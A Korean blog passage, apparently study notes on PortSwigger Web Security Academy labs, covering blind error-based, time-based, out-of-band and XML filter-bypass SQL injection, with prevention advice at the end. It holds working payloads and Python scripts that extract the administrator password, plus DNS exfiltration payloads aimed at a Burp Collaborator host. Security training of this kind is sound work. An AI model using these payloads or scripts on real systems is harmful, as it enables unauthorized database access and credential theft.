        else:
            low = mid

    password += chr(low)
    print(f"Temp Password: {password}")

print(f"Password: {password}")
```

위의 코드를 실행하면 한 자씩 이진 탐색하며 패스워드를 알아낼 수 있다.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/9ccfc2bd-7211-4d08-96da-79e968542d31)

알아낸 패스워드로 `administrator` 계정에 로그인하면 문제를 해결할 수 있다.

<br><br>

# #Error-based SQL injection

Error-based SQL 인젝션은 블라인드 컨텍스트에서도 에러 메시지를 사용하여 데이터베이스로부터 민감한 데이터를 추출하거나 추론할 수 있는 경우를 나타낸다. 취약점의 가능성은 데이터베이스의 구성 사항과 발생시킬 수 있는 에러의 종류에 달려있다.

- 애플리케이션이 boolean 표현식의 결과에 따른 특정한 에러 응답을 반환하도록 유도할 수도 있다. 이전 섹션에서 살펴본 조건부 응답과 동일한 방식으로 이를 활용할 수 있다.
- 쿼리에 의해 반환되는 데이터를 출력하는 에러 메시지를 발생시킬 수도 있다. 이는 블라인드 SQL 인젝션 취약점을 눈에 보이는 취약점으로 효과적으로 전환한다.

<br>

## Exploiting blind SQL injection by triggering conditional errors

몇몇의 애플리케이션은 SQL 쿼리를 수행하나 쿼리가 어떠한 데이터를 반환하는지를 제외하고는 동작을 바꾸지 않기도 한다. 이전 섹션에서의 기술은 동작하지 않을 것인데 이는 다른 boolean 조건을 주입하는 것이 애플리케이션의 응답에 차이를 만들지 않기 때문이다.

<br>

종종 애플리케이션이 SQL 에러를 발생시키는지에 따라 다른 응답을 반환하도록 유도하는 것이 가능하다. 조건이 참일 때 데이터베이스 에러를 발생시키도록 쿼리를 수정할 수 있다. 데이터베이스에서 처리되지 않은 오류가 발생하면 오류 메시지와 같은 애플리케이션 응답에서 차이가 발생하는 경우가 많다. 이는 삽입된 조건의 참거짓 여부를 추론할 수 있도록 해준다.

<br>

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

이것이 동작하는 것을 보기 위해서는 위처럼 `TrackingId` 쿠키 값을 포함하여 차례로 요청을 전송한다고 가정해보자. 이러한 입력은 `CASE` 키워드를 사용하여 조건을 테스트하고 어떤 표현식이 참인지에 따라 다른 표현식을 반환한다.

<br>

- 첫 번째 입력에서 `CASE` 표현식은 `'a'`를 평가하고 어떠한 에러도 발생시키지 않는다.
- 두 번째 입력에서 `1/0`로 평가되어 divide-by-zero 에러를 발생시킨다.

이 에러가 애플리케이션의 응답에 차이를 발생시킨다면, 이를 이용하여 삽입된 조건문이 참이라는 것을 결정할 수 있다.

<br>

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

이 방법을 사용하여 한 번에 하나의 문자를 테스트함으로써 데이터를 조회할 수 있다.

<br>

## 🚩Lab: Blind SQL injection with conditional errors

우선 메인페이지에 접속하여 포함된 쿠키 값을 살펴보면 `TrackingId`라는 이름의 쿠키가 설정되어 있는 것을 확인할 수 있다.

<br>

쿠키 값을 `bAKMSIzJgUpF1ga9' AND 'a'='b`로 하여 요청을 하면 조건문이 거짓임에도 웹 사이트에 아무런 변화가 발생하지 않는다. 그렇다면 이전 랩에서 진행한 방법으로는 Blind SQL injection을 수행할 수 없다.

<br>

그러나 쿠키 값을 `bAKMSIzJgUpF1ga9' AND 1/0 --`로 하여 요청을 보내면 divide-by-zero 에러가 발생하기에 웹 사이트에서 Internal Server Error를 확인할 수 있다. 이렇게 에러의 발생 유무에 따라 조건문을 추가하여 Error-based SQL 인젝션을 진행해보자.

<br>

`TrackingId=bAKMSIzJgUpF1ga9' AND (SELECT CASE WHEN length(password) <> 1 THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --`

우선 패스워드의 길이를 알기 위해서 위와 같은 페이로드를 작성할 수 있다. 만약 패스워드의 길이가 1이 아니라면 `to_char(1/0)`을 수행하여 에러를 발생시킬 것이다. 이렇게 1씩 늘려가며 패스워드의 길이를 알아내는 Python 코드를 작성할 수 있다.


<br>

```python
import requests

url = 'https://0aa900aa038314dd80f6443500f100a4.web-security-academy.net/'
len = 1

while True:
    headers={"Cookie": f"TrackingId=bAKMSIzJgUpF1ga9' AND (SELECT CASE WHEN length(password) <> {len} THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --"}

    response = requests.get(url, headers=headers)
    print(len)

    if 'Internal Server Error' in response.text:
        len += 1
    else:
        print(f"Length of password is {len}")
        break
```

위의 코드를 실행하면 아래 이미지와 같이 패스워드의 길이가 20인 것을 알아낼 수 있다.

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/ff458b1e-95ca-40d3-ab54-7641d26509c4)

<br>

`bAKMSIzJgUpF1ga9' AND (SELECT CASE WHEN SUBSTR(password, 1, 1) < 'm' THEN 'a' ELSE to_char(1/0) END FROM users WHERE username='administrator')='a' --`

이제 Oracle의 `SUBSTR` 함수를 이용하여 패스워드를 하나씩 추출해보자. 이 때 divide-by-zero 에러를 발생 시키는 `to_char(1/0)`을 ELSE 문에 넣어 직관적으로 이해하도록 하였다. 이제 페이지가 에러를 발생시키면 조건문이 거짓이라는 것이고, 에러가 발생하지 않으면 조건문이 참이라는 것을 알게 된다. 이 페이로드를 이용하여 Python 코드를 작성하여 패스워드를 추출해보자.

<br>

```python
import requests

url = 'https://0aa900aa038314dd80f6443500f100a4.web-security-academy.net/'
password = ""

for i in range(20):
    low = 32
    high = 126

    while low+1 < high:
        mid = (low + high) // 2
        headers = {
            "session":"Oeq5rqh6iPiS4v7ax15lHB56gtL1ogwN",
            "Cookie": f"TrackingId=bAKMSIzJgUpF1ga9' AND (SELECT CASE WHEN SUBSTR(password, {i+1}, 1) < '{chr(mid)}' THEN 'a' ELSE to_char(1/0) END FROM users WHERE username='administrator')='a' --"
        }
        response = requests.get(url, headers=headers)

        if "Internal Server Error" in response.text:
            low = mid
        else:
            high = mid

    password += chr(low)
    print(f"[{i+1}]Temp Password: {password}")

print(f"Password: {password}")
```

위처럼 코드를 작성할 수 있다. Internal Server Error가 발생하는지에 따른 조건문을 신경써야 한다.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/53c2a9d4-c2c4-41e5-8937-856af26f079c)

코드를 실행하면 쉽게 패스워드를 구할 수 있고, 해당 비밀번호로 administrator 계정에 로그인하면 문제를 해결할 수 있다.

<br>

## Extracting sensitive data via verbose SQL error messages

`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`

때때로 데이터베이스를 잘못 구성하면 자세한 에러 메시지가 나타나는 경우가 있다. 이는 공격자에게 유용한 정보를 제공할 수도 있다. 예를 들어, 위와 같은 에러 메시지는 `id` 파라미터에 싱글 쿼터를 삽입한 후에 발생한다.

<br>

이는 우리의 입력을 사용하여 애플리케이션이 구성한 전체 쿼리를 보여준다. 이 경우 `WHERE` 절 내에 싱글 쿼터로 묶인 문자열을 삽입하고 있음을 알 수 있다. 이는 악의적인 페이로드를 포함한 유효한 쿼리를 만들기 쉽게 만들어준다. 쿼리의 나머지 부분을 주석 처리하면 싱글 쿼터로 인해 구문이 손상되는 것을 막을 수 있다.

<br>

때로는 애플리케이션이 쿼리에 의해 반환된 일부 데이터가 포함된 에러 메시지를 애플리케이션이 생성하도록 유도할 수 있다. 이는 블라인드  SQL 인젝션 취약점을 눈으로 볼 수 있도록 효과적으로 바꿔준다.

<br>

`CAST((SELECT example_column FROM example_table) AS int)`

이를 이루기 위해 `CAST()` 함수를 사용할 수 있다. 이 함수는 하나의 데이터 타입을 다른 것으로 바꿔준다. 예를 들어, 위와 같은 구문을 포함하는 쿼리를 생각해보자.

<br>

`ERROR: invalid input syntax for type integer: "Example data"`

대부분 우리가 읽고자 하는 데이터는 문자열이다. 이를 `int`와 같이 호환되지 않는 않는 데이터 타입으로 변환하는 시도는 위와 비슷한 에러를 발생시킬지도 모른다. 이러한 종류의 쿼리는 문자 제한으로 인해 조건부 응답을 트리거할 수 없는 경우에 유용할 수 있다.

<br>

## 🚩Lab: Visible error-based SQL injection

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/9d07d167-5ab6-434b-96b8-83a8da931ed0)

이전 랩과 마찬가지로 메인 페이지에서 `TrackingId` 이름의 쿠키 값을 포함하고 있는 것을 확인할 수 있다. 이 쿠키 값이 에러를 발생시키도록 싱글 쿼터 `'` 하나를 뒤에 포함시켜 요청하면 위와 같이 전체 쿼리문을 포함한 에러 메시지를 확인할 수 있다.

<br>

`TrackingId=K2emZe0i0ZYT4WTP' AND CAST((SELECT 1) as int)=1--`

이 에러 메시지를 이용하기 위해 `CAST` 함수를 이용하자. 먼저 `TrackingId` 값을 위와 같이 구성하여 요청을 보내면 오류 메시지 없이 정상적으로 페이지를 불러올 수 있다.

<br>

`TrackingId=K2emZe0i0ZYT4WTP' AND CAST((SELECT password FROM users WHERE username='administrator') as int)=1--`

이제 `users` 테이블에 있는 `administrator` 계정의 패스워드를 구해보자. 위와 같이 쿠키 값을 설정하여 요청을 보내보자.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/a48e736b-dbee-4123-b133-ee01b05a8532)

위와 같은 에러 메시지를 확인할 수 있는데 이는 서버에서 받은 쿠키 값의 문자열을 자르는 것으로 보인다. 페이로드를 짧게 만들어야함을 알 수 있다.

<br>

`TrackingId=' AND CAST((SELECT password FROM users) as int)=1--`

문자열을 짧게 하기 위해 기존의 쿠키 값을 빈칸으로 만들어 요청을 보내보자.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/46c9c668-cbbb-4b78-b897-16ca3118b8aa)

위와 같은 에러 메시지를 확인할 수 있는데 쿼리의 반환 값으로 둘 이상의 데이터를 받아서 에러를 일으킨 것이다. 이를 제한하기 위해 `LIMIT` 키워드를 사용해보자.

<br>

`TrackingId=' AND CAST((SELECT username FROM users LIMIT 1) as int)=1--`

`LIMIT` 키워드를 이용하여 1개의 데이터를 추출하였다.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/b745d178-aca1-4a5f-bb3c-0b9501e39ede)

결과에서 보면 추출한 1개의 데이터의 `username`이 `administrator`라는 것을 확인하였고, 이를 통해 `administrator` 계정이 테이블의 첫 번째 데이터임을 알 수 있다. 따라서 `password` 값도 가장 첫 번째 데이터가 `administrator`의 값일 것이다.

<br>

`TrackingId=' AND CAST((SELECT password FROM users LIMIT 1) as int)=1--`

`LIMIT` 키워드로 1개의 패스워드를 조회하면

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/17780dc0-e676-42ad-bc96-eafbcf313b45)

위와 같이 테이블의 첫 번째 데이터인 `administrator` 계정의 password를 획득할 수 있다. 이 값으로 로그인하면 문제를 해결할 수 있다.

<br><br>

# #Exploiting blind SQL injection by triggering time delays

만일 애플리케이션이 SQL 쿼리가 실행될 때 데이터베이스 에러를 포착하고 이를 정상적으로 처리하는 경우, 애플리케이션의 응답에 어떠한 차이도 없을 것이다. 이 말은 조건부 에러를 유도하기 위한 이전의 기술은 소용없다는 의미이다.

<br>

이러한 상황에서 삽입된 조건문이 참인지 거짓인지에 따라 시간 지연을 발생시킴으로써 블라인드 SQL 인젝션을 이용하는 것이 가능하다. SQL 쿼리는 일반적으로 애플리케이션에 의해 동기식으로 처리하므로 SQL 쿼리의 실행을 지연시키는 것은 마찬가지로 HTTP 응답을 지연시킨다. 이는 HTTP 응답을 받기 위해 걸린 시간을 기반으로 삽입된 조건절의 참 거짓 여부를 결정할 수 있다.

<br>

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

시간 지연을 발생시키는 기술은 사용 중인 데이터베이스의 종류에 따라 특정된다. 예를 들어, Microsoft SQL Server에서 조건문을 테스트하고 표현식이 참인지에 따른 시간 지연을 발생하기 위해 위와 같은 페이로드를 사용할 수 있다.

- 첫 번재 입력은 지연을 발생시키지 않는데, `1=2`가 거짓이기 때문이다.
- 두 번째 입력은 10초의 지연을 발생시키는데, `1=1`이 참이기 때문이다.

<br>

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

이 기술을 사용하면 우리는 한 번에 한 문자씩 테스트함으로써 데이터를 조회할 수 있다.

<br>

## 🚩Lab: Blind SQL injection with time delays and information retrieval

이 랩에서는 이전 랩들과 마찬가지로 `TrackingId` 쿠키 값에 SQL 인젝션을 시도하는 문제이다. 그러나 이전 문제들과는 다르게 삽입된 값으로 인해 구성된 SQL문의 결과가 에러를 발생할 때 웹 사이트에 변화를 주지 않는다. 여기서는 Time-based SQL injection을 시도해보자.

<br>

`abc' %3b SELECT CASE WHEN username='administrator' AND length(password) = 1 THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --`

해당 서비스는 PostgreSQL 데이터베이스를 사용하므로 `pg_sleep()` 함수를 사용하여 페이로드를 구성하였다. `%3b`는 `;`을 url 인코딩 한 값이다. 만약 이 쿠키 값을 포함하여 요청을 보냈을 때 요청에 대한 응답이 오기까지 5초 가량이 소요된다면 이는 조건문인 `length(password) = 1`가 참이라는 것을 알 수 있다. 이를 이용하여 Python 코드를 작성해보자.

<br>

```python
import requests, time

url = 'https://0af3004e040a35fc82dc7e0300cf0080.web-security-academy.net/'
len = 1

while True:
    headers={"Cookie": f"TrackingId=abc' %3b SELECT CASE WHEN username='administrator' AND length(password) = {len} THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --"}

    start_time = time.time()
    response = requests.get(url, headers=headers)
    print(len)

    if time.time() - start_time >= 5:
        print(f"Length of password is {len}")
        break
    else:
        len += 1
```

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/87655709-0211-49d3-b9b1-6db44d2fb638)

코드를 실행하면 위와 같이 패스워드의 길이가 20인 것을 알아낼 수 있다.

<br>

이제 `SUBSTR` 함수를 이용해 20자의 패스워드를 한 자씩 알아내야 한다. 오랜 시도와 시간이 걸리기에 Python 코드로 작성하자.

<br>

```python
import requests, time

url = 'https://0af3004e040a35fc82dc7e0300cf0080.web-security-academy.net/'
password = ""

for i in range(20):
    low = 32
    high = 126

    while low+1 < high:
        mid = (low + high) // 2
        headers = {
            "session" : "ZEjsXhcRoquKrD1f5mf2fAH8PJTqp8wK",
            "Cookie": f"TrackingId=abc' %3b SELECT CASE WHEN username='administrator' AND SUBSTR(password, {i+1}, 1) < '{chr(mid)}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --"
        }

        start_time = time.time()
        response = requests.get(url, headers=headers)

        if time.time() - start_time >= 5:
            high = mid
        else:
            low = mid

    password += chr(low)
    print(f"[{i+1}]Temp Password: {password}")

print(f"Password: {password}")
```

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/53930651-e0f9-4d59-91ff-44882c16df55)

코드를 실행하면 위와 같이 패스워드를 얻을 수 있고 이를 이용하여 로그인하면 문제를 해결할 수 있다.

<br><br>

# #Exploiting blind SQL injection using out-of-band (OAST) techniques

애플리케이션은 이전 예제와 동일한 SQL 쿼리를 수행할 수 있지만 이를 비동기적으로 수행한다. 애플리케이션은 사용자의 요청은 원래의 스레드에서 처리하고 다른 스레드를 사용하여 추적 쿠키를 사용하여 SQL 쿼리를 실행한다. 쿼리는 SQL 인젝션에 여전히 취약하나, 지금까지 설명한 기술 중 어느 것도 작동하지 않는다. 애플리케이션의 응답은 데이터를 반환하는 쿼리, 에러가 발생하는 데이터베이스 또는 쿼리를 실행하는 데 걸리는 시간에 의존하지 않는다.

<br>

제어하는 시스템에 대해 out-of-band 네트워크 상호 작용을 트리거하여 블라인드 SQL 인젝션 취약점을 악용하는 것이 가능한 경우가 많다. 이는 삽입된 조건을 기반으로 트리거 되어 한 번에 한 조각씩 정보를 추론할 수 있다. 또한 네트워크 상호 작용 내에서 직접적으로 데이터를 추출할 수 있다.

<br>

이 목적을 위해 다양한 네트워크 프로토콜을 사용할 수 있지만 일반적으로 가장 효과적인 것은 DNS(도메인 이름 서비스)이다. 많은 프로덕션 네트워크에서는 프로덕션 시스템의 정상적인 작동에 필수적이기 때문에 DNS 쿼리의 무료 송신을 허용한다.

<br>

> **OAST**
> <br>
> :Out-of-Band Application Security Testing. 진단자가 제어하는 인프라로 대상을 강제로 호출하여 웹 애플리케이션에서 악용 가능한 취약점을 찾는 방법
{: .prompt-tip }

<br>

out-of-band 기술을 사용하기에 가장 쉽고 신뢰할 수 있는 도구는 *Burp Collaborator*이다. 이는 DNS를 포함한 다양한 네트워크 서비스의 커스텀 구현을 제공하는 서버이다. 이를 통해 취약한 애플리케이션에 개별적인 페이로드를 전송한 결과 네트워크 상호작용이 발생하는 시기를 감지할 수 있다.

<br>

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

DNS 쿼리를 트리거하기 위한 기술은 사용하고 있는 데이터베이스의 종류에 따라 특정된다. 예를 들어, 위의 Microsoft SQL Server에 대한 입력 값을 사용하여 지정된 도메인에서 DNS 조회를 수행할 수 있다.

<br>

`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

이는 위의 도메인에서 데이터베이스를 조회할 수 있게 해준다.

<br>

*Burp Collaborator*를 사용하여 고유한 서브 도메인을 생성하고 Collaborator Server를 poll하여 DNS 조회가 언제 발생하는지 확인할 수 있다.

<br>

## 🚩Lab: Blind SQL injection with out-of-band interaction

(Skipped)

<br>

`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

out-of-band 상호작용을 트리거하는 방법을 확인한 후에는 위와 같이 out-of-band 채널을 사용하여 취약한 애플리케이션에서 데이터를 추출할 수 있다.

<br>

이 입력은 `Administrator` 사용자의 패스워드를 읽고, 고유한 Collaborator 서브 도메인을 추가하고, DNS 조회를 트리거한다. 이 조회는 캡쳐된 패스워드를 볼 수 있게 해준다.

<br>

Out-of-baand (OAST) 기술은 out-of-band 채널 내에서 직접적으로 데이터를 추출하는 능력과 높은 성공 확률 덕분에 블라인드 SQL 인젝션이 존재하는지 탐지하고 익스플로잇하는 강력한 방법이다. 이러한 이유로, OAST 기술은 다른 맹목적인 공격 기술이 작동하는 상황에서도 선호되는 경우가 많다.

<br>

> out-of-band 상호작용을 트리거하는 다양한 방법이 있고 다양한 데이터베이스 종류에 적용되는 다양한 기술이 있다. 자세한 내용은 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)에서 확인할 수 있다.
{: .prompt-info }

<br>

## 🚩Lab: Blind SQL injection with out-of-band data exfiltration

(Skipped)

<br><br>

# #SQL injection in different contexts

이전의 랩에서 악의적인 SQL 페이로드를 삽입하기 위해 쿼리 스트링을 사용했다. 그러나, 애플리케이션에서 SQL 쿼리로 처리되는 제어 가능한 입력을 사용하여 SQL 인젝션 공격을 수행할 수 있다. 예를 들어, 어떤 웹사이트는 JSON이나 XML 형식으로 입력을 받고 이를 이용하여 데이터베이스에 쿼리를 한다.

<br>

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

이러한 다양한 형식은 WAF 및 다른 방어 메커니즘 때문에 차단되는 공격을 난독화 할 수 있는 다양한 방법을 제공한다. 약한 구현은 요청 내에서 일반적인 SQL 인젝션 키워드를 찾는 경우가 많기에, 금지된 키워드에 있는 문자들을 인코딩하거나 이스케이프 처리하여 이러한 필터를 우회할 수 있다. 예를 들어, 위의 XML 기반 SQL 인젝션은 XML 이스케이프 시퀀스를 사용하여 `SELECT` 내에 있는 `S` 문자를 인코딩한다. 이는 서버 측에서 SQL 해석기로 전달되기 전에 복호화된다.

<br>

## 🚩Lab: SQL injection with filter bypass via XML encoding

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/ce11f7ac-a525-423c-94ed-6543508e8b54)

물건의 재고를 조회할 때 요청하는 패킷을 보면 XML 형식으로 데이터를 보내는 것을 확인할 수 있다.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/7deb4e42-6106-4634-a15d-81b6742eca56)
b54)

`storeId` 필드에 `SELECT 1`과 같은 SQL 쿼리를 삽입하여 요청을 보내면 위와 같이 필터링 되는 것을 알 수 있다.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/e4fb25cf-a412-4aed-8af7-f88073114593)

버프스위트의 Decoder 기능을 통해 `SELECT` 문자열을 HTML 인코딩 하여 `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; 1`과 같이 쿼리를 만들어 요청을 다시 보내면 정상적으로 요청을 받는다.

<br>

이제 `users` 테이블에서 관리자의 패스워드를 조회해보자. 우선, 데이터를 추출하기 위해 `storeId` 필드의 값을 이용하여 수행하는 SQL문의 구조를 파악해보자. 아래와 같은 일련의 과정을 통해 구조를 파악하고 패스워드를 찾아내었다. 요청을 보낼 때 필터링 되는 문자들은 모두 인코딩하여 요청하였다.

<br>

1. `1' --`

    정상적으로 재고를 조회하지 못하는 것으로 보아 storeId 필드가 문자열이 아니다.

2. `1 --`

    정상적으로 재고를 조회하지 하는 것으로 보아 storeId 필드는 숫자 데이터이다.

3. `1 UNION SELECT NULL --`

    ![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/2a258731-cee1-409e-9334-3d658f6b143d)

    null을 출력하는 것으로 보아 해당 SQL문 결과의 컬럼 수는 1개이다.

4. `1 UNION SELECT password FROM users WHERE username='administrator' --`

    ![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/a639f7c8-146c-4fe8-a3f0-98ff3b87fb70)

    administrator의 패스워드를 확인할 수 있다.

<br>

🔽 최종 XML 요청 값

```
<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; password FROM users WHERE username=&#x27;administrator&#x27; &#x2d;&#x2d;
        </storeId>
    </stockCheck>
```

<br><br>

# #Second-order SQL injection

1차 SQL 인젝션은 애플리케이션이 HTTP 요청의 사용자 입력을 처리하고 해당 입력을 안전하지 않은 방식으로 SQL 쿼리에 통합될 때 발생한다.

2차 SQL 인젝션은 애플리케이션이 HTTP 요청의 사용자 입력을 갖고 나중에 사용하기 위해 저장할 때 발생한다. 이는 입력 값을 데이터베이스에 배치하여 수행되는데, 데이터가 저장되는 시점에는 취약점이 발생하지 않는다. 이후에 다양한 HTTP 요청을 다룰 때, 애플리케이션이 저장된 데이터를 조회하고 안전하지 않은 방식으로 SQL 쿼리에 통합한다. 이러한 이유로 2차 SQL 인젝션은 stored SQL 인젝션으로 알려져 있다.

<br>

2차 SQL 인젝션은 개발자가 SQL 인젝션 취약점을 인지하고 데이터베이스에 대한 입력의 초기 배치를 안전하게 처리하는 상황에서 자주 발생한다. 데이터가 나중에 처리되면 이전에 데이터베이스에 안전하게 보관했기 때문에 안전하다고 간주된다. 이 시점에 개발자는 데이터가 신뢰할 수 있는 것으로 잘못 간주하기 때문에 데이터는 안전하지 않은 방식으로 처리된다.

<br><br>

# #How to prevent SQL injection

쿼리 내에 문자열을 연결하는 대신, 파라미터화 된 쿼리를 사용하여 대부분의 SQL 인젝션 사례를 방지할 수 있다. 이렇게 파라미터화된 쿼리는 "prepared statements"라고 알려져 있다.

<br>

```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

위의 코드는 사용자 입력을 쿼리에 바로 연결시키기 때문에 SQL 인젝션에 취약하다.

<br>

```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

사용자 입력 값이 쿼리 구조를 방해하지 않도록 이 코드를 위와 같은 방식으로 다시 작성할 수 있다.

<br>

`WHERE`절과 `INSERT` 혹은 `UPDATE`문 내의 값을 포함하여 신뢰할 수 없는 입력이 쿼리 내의 데이터로 나타나는 모든 상황에 대해 매개변수화된 쿼리를 사용할 수 있다. 테이블이나 컬럼 이름, `ORDER BY`절과 같은 쿼리의 다른 부분에서 신뢰할 수 없는 입력을 처리하는 데는 사용할 수 없다. 신뢰할 수 없는 데이터를 이러한 쿼리의 일부분으로 배치하는 애플리케이션 기능은 다음과 같은 다른 방법으로 접근할 필요가 있다.

- 허용된 입력 값을 화이트리스트에 추가
- 필요한 동작을 제공하기 위해 다양한 논리 사용

<br>

파라미터화된 쿼리가 SQL 인젝션을 방지하기 위해 효과적이기 위해서는 쿼리 내에 사용되는 문자열은 반드시 하드 코딩된 상수이어야 한다. 이는 어떤 출처의 변수 데이터도 포함하면 안된다. 데이터 항목을 신뢰할 수 있는지 여부를 사례별로 결정하려는 유혹에 빠지지 말고 안전한 것으로 간주되는 사례에 대해 쿼리 내에서 문자열 연결을 계속 사용해야 한다. 이는 데이터의 출처에 대해 실수하거나 다른 코드를 변경하여 신뢰할 수 있는 데이터를 오염시키기 쉽다.

<br><br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/4749c052-c288-44e1-b2c4-be0a46e334d8)
